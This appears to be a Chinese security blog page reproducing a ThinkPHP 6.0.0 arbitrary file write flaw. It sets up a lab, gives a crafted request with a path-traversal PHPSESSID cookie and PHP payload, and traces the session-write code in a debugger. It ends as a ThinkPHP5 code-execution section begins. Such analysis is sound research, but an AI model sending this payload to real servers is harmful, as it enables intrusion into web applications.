@@ -1,0 +1,1989 @@
+<!DOCTYPE html>
+<html lang="zh">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="fe1w0">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="fe1w0">
+    
+    <meta name="keywords" content="fe1w0,fe1w0,fe1w0-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="环境搭建与基础知识参考链接GitHub - Mochazz&#x2F;ThinkPHP-Vuln: 关于ThinkPHP框架的历史漏洞分析集合 环境搭建Win20h 、PHP 7.4.3 、VScode  PHPSTORM xdebug   配置一直失败,give up 而VScode(WSL)又不能查上下文,😑😶😡   Composer  个人感觉比较方便,不用去官网找 1234composer c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THINKPHP 漏洞复现">
+<meta property="og:url" content="https://fe1w0.github.io/2021/03/14/Thinkphp/index.html">
+<meta property="og:site_name" content="fe1w0">
+<meta property="og:description" content="环境搭建与基础知识参考链接GitHub - Mochazz&#x2F;ThinkPHP-Vuln: 关于ThinkPHP框架的历史漏洞分析集合 环境搭建Win20h 、PHP 7.4.3 、VScode  PHPSTORM xdebug   配置一直失败,give up 而VScode(WSL)又不能查上下文,😑😶😡   Composer  个人感觉比较方便,不用去官网找 1234composer c">
+<meta property="og:locale">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223131526399.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223131548801.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223131959447.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223094208017.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223094223116.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223132913970.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223133027613.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223134523855.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223135033653.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223135236714.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223135430345.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223151156981.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223173352242.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223173447869.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223162310793.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223163627195.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223173631154.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223173906362.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223174240975.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223174438088.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223174758204.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223175215752.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223175415189.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223181721771.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223181807799.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223181908098.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223175626111.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223182825634.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223180020120.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223190414879.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223190437197.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223190509511.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223190529028.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223190711429.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223190910594.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/image-20210223190509511.png">
+<meta property="og:image" content="http://img.xzaslxr.xyz/20191127228626.jpg">
+<meta property="article:published_time" content="2021-03-14T04:00:00.000Z">
+<meta property="article:modified_time" content="2021-03-14T16:38:17.613Z">
+<meta property="article:author" content="fe1w0">
+<meta property="article:tag" content="thinkphp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://img.xzaslxr.xyz/image-20210223131526399.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>THINKPHP 漏洞复现 · fe1w0_blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.jpg" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >follow my dream</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">THINKPHP 漏洞复现</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>follow my dream</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(https://source.unsplash.com/user/erondu)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            THINKPHP 漏洞复现
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "thinkphp">thinkphp</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.9k</span>阅读时长: <span class="post-count reading-time">13 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2021/03/14</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="环境搭建与基础知识"><a href="#环境搭建与基础知识" class="headerlink" title="环境搭建与基础知识"></a>环境搭建与基础知识</h1><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://github.com/Mochazz/ThinkPHP-Vuln">GitHub - Mochazz/ThinkPHP-Vuln: 关于ThinkPHP框架的历史漏洞分析集合</a></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Win20h 、PHP 7.4.3 、VScode</p>
+<blockquote>
+<p>PHPSTORM xdebug   配置一直失败,give up</p>
+<p>而VScode(WSL)又不能查上下文,😑😶😡</p>
+</blockquote>
+<ul>
+<li>Composer</li>
+</ul>
+<p>个人感觉比较方便,不用去官网找</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">composer config -g repo.packgist composer https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;composer</span><br><span class="line">composer create-project topthink&#x2F;think&#x3D;6.0.* tp6</span><br><span class="line"># tophink&#x2F;think&#x3D; 加 版本号</span><br><span class="line"># tp6 指项目目录,没有会自动创建</span><br></pre></td></tr></table></figure>
+
+<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><blockquote>
+<p>天哪,thinkphp的设计的好优秀,膜</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp5/">ThinkPHP5.0完全开发手册 · 看云 (kancloud.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp6_0">ThinkPHP6.0完全开发手册 · 看云 (kancloud.cn)</a></p>
+<h1 id="任意文件操作漏洞"><a href="#任意文件操作漏洞" class="headerlink" title="任意文件操作漏洞"></a>任意文件操作漏洞</h1><h2 id="thinkphp6"><a href="#thinkphp6" class="headerlink" title="thinkphp6"></a>thinkphp6</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/UPu6cE20l24T6fkYOlSUJw">ThinkPHP6任意文件操作漏洞分析 (qq.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8546">Thinkphp6.0任意文件写入漏洞复现 - 先知社区 (aliyun.com)</a></p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>ThinkPHP6.0.0-6.0.1</p>
+<h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink&#x2F;think tp60</span><br></pre></td></tr></table></figure>
+
+<p>将 <strong>tp60/composer.json</strong> 文件的 <strong>“topthink/framework”: “^6.0.*“,</strong> 改成 <strong>6.0.0</strong> 版本，并执行如下命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure>
+
+<h4 id="Debug配置"><a href="#Debug配置" class="headerlink" title="Debug配置"></a>Debug配置</h4><p>建议不要<code>php run ./think --host=localhost --port=8000</code></p>
+<blockquote>
+<p>好像这样的话,PHPSTORM无法debug </p>
+</blockquote>
+<p>当前环境为phpstudy+phpstorm</p>
+<p>xdebug由phpstudy下载,同时修改配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[Xdebug]</span><br><span class="line">zend_extension&#x3D;D:&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;php&#x2F;php7.4.3nts&#x2F;ext&#x2F;php_xdebug.dll</span><br><span class="line">xdebug.collect_params&#x3D;1</span><br><span class="line">xdebug.collect_return&#x3D;On</span><br><span class="line">xdebug.auto_trace&#x3D;On</span><br><span class="line">xdebug.profiler_enable_trigger &#x3D; Off</span><br><span class="line">xdebug.trace_output_dir&#x3D;D:&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;php_log&#x2F;php7.4.3nts.xdebug.trace</span><br><span class="line">xdebug.profiler_enable&#x3D;On</span><br><span class="line">xdebug.profiler_output_dir&#x3D;D:&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;php_log&#x2F;php7.4.3nts.xdebug.profiler</span><br><span class="line">xdebug.remote_enable&#x3D;On	</span><br><span class="line">xdebug.remote_host&#x3D;localhost</span><br><span class="line">xdebug.idekey&#x3D;&quot;PHPSTORM&quot;</span><br><span class="line">xdebug.remote_port&#x3D;9000</span><br><span class="line">xdebug.remote_handler&#x3D;dbgp</span><br></pre></td></tr></table></figure>
+
+<p>添加服务器</p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223131526399.png" alt="image-20210223131526399"></p>
+<p>DBGp 代理</p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223131548801.png" alt="image-20210223131548801"></p>
+<p>配置成功</p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223131959447.png" alt="image-20210223131959447"></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>修改<strong>app/controller/Index.php</strong> 文件如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        session(<span class="string">&#x27;demo&#x27;</span>, $_GET[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ThinkPHP V6.0.0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params">$name = <span class="string">&#x27;ThinkPHP6&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello,&#x27;</span> . $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修改 <strong>app/middleware.php</strong> 文件如下（开启Session功能，可参考： <a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp6_0/1037635">https://www.kancloud.cn/manual/thinkphp6_0/1037635</a> ）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 全局中间件定义文件</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 全局请求缓存</span></span><br><span class="line">    <span class="comment">// \think\middleware\CheckRequestCache::class,</span></span><br><span class="line">    <span class="comment">// 多语言加载</span></span><br><span class="line">    <span class="comment">// \think\middleware\LoadLangPack::class,</span></span><br><span class="line">    <span class="comment">// Session初始化</span></span><br><span class="line">     \think\middleware\SessionInit::class</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+
+<p>写入文件</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?c=aaaa&lt;?php+phpinfo();+?&gt;</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8000</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=../../../../public/aaaaaaaaa.php</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意len(PHPSESSID)要等于32位</p>
+</blockquote>
+<p><img src="http://img.xzaslxr.xyz/image-20210223094208017.png" alt="image-20210223094208017"></p>
+<p>访问<code>http://127.0.0.1:8000/aaaaaaaaa.php</code></p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223094223116.png" alt="image-20210223094223116"></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先,查看session_save</p>
+<p>位于<code>vendor/topthink/framework/src/think/session/Store.php</code></p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223132913970.png" alt="image-20210223132913970"></p>
+<p>在<code>save</code>函数处,<code>write</code>为写入文件</p>
+<p>单步调试,进入<code>vendor/topthink/framework/src/think/session/driver/File.php</code></p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223133027613.png" alt="image-20210223133027613"></p>
+<p><code>writeFile</code>处步入</p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223134523855.png" alt="image-20210223134523855"></p>
+<p>可以观察到最终执行为<code>file_put_contents($path, $content, LOCK_EX);</code>,<code>$path</code>为<code>$sessionId</code>控制,<code>$content=$sessData=$data</code></p>
+<p>而一开始的<code>$this-&gt;handler-&gt;write($sessionId, $data)</code>接受两个参数<code>$sessionId, $data</code></p>
+<p><code>$data</code>为session序列化后的内容,可控</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        session(<span class="string">&#x27;demo&#x27;</span>, $_GET[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ThinkPHP V6.0.0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params">$name = <span class="string">&#x27;ThinkPHP6&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello,&#x27;</span> . $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而<code>$sessionId</code>则为</p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223135033653.png" alt="image-20210223135033653"></p>
+<p>断点步入<code>getId()</code>,<code>vendor\topthink\framework\src\think\session\Store.php</code></p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223135236714.png" alt="image-20210223135236714"></p>
+<p><code>$this-&gt;id</code>由<code>setId</code>初始化</p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223135430345.png" alt="image-20210223135430345"></p>
+<p>由此可见,当<code>len(PHPSESSID) == 32</code>为 <code>PHPSESSID</code>,反之<code>md5(microtime(true) . session_create_id())</code></p>
+<h1 id="任意代码执行漏洞"><a href="#任意代码执行漏洞" class="headerlink" title="**任意代码执行漏洞 **"></a>**任意代码执行漏洞 **</h1><p>该漏洞出现的原因在于ThinkPHP5框架底层对控制器名过滤不严，从而让攻击者可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致getshell漏洞</p>
+<p>参考链接:</p>
+<p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/04/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10/">ThinkPHP5漏洞分析之代码执行(十) | Mochazz’s blog</a></p>
